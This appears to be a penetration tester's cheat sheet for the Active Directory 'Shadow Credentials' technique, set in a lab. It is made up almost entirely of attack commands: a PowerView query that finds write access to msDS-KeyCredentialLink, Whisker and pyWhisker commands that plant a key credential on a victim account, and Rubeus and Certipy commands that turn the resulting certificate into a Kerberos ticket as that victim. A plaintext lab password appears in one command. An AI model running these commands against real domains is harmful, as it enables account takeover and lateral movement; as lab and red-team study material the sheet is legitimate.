# Shadow Credentials
```
msDS-KeyCredentialLink GUID: 5b47d60f-6051-40fb-99e0-ed3a78604e5d

Windows Hello for Business (WHfB)
```

# Search msDS-KeyCredentialLink attribute
```powershell 
Get-DomainObjectAcl | Where-Object {
     $_.ObjectAceType -eq "5b47d60f-6051-40fb-99e0-ed3a78604e5d" # msDS-KeyCredentialLink-in GUID-i
 } | Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},
                   @{Name="TargetObject"; Expression={Convert-SidToName $_.ObjectSID}},
                   ActiveDirectoryRights -Unique


Get-DomainObjectAcl  | Where-Object { $_.ObjectAceType -eq "5b47d60f-6051-40fb-99e0-ed3a78604e5d" }
```

# Whisker
```powershell
.\Whisker.exe add /target:TargetObject /domain:lab.local /dc:dc01.lab.local
.\Whisker.exe list /target:TargetObject

.\Whisker.exe remove /target:TargetObject /deviceid:<DeviceID_from_add_command>
```

# PyWhisker
```powershell
python3 /home/sako/Tools/pywhisker.py \
  -d "warzone.oxsium.local" \
  -u "ShadowOperator1" \
  -p 'Oxsium_Lab123!' \
  --target "VictimUser" \
  --action "add" \
  --dc-ip 192.168.0.199 \
  --use-ldaps
```

# Rubeus
```powershell
.\Rubeus.exe asktgt /user:TargetObject /certificate:MII...base64... /password:"WhiskerPassword" /gettgtpkinit
```

# Certipy
```powershell
certipy auth -pfx target.pfx -dc-ip <DC_IP> -username target_user -domain lab.local
```
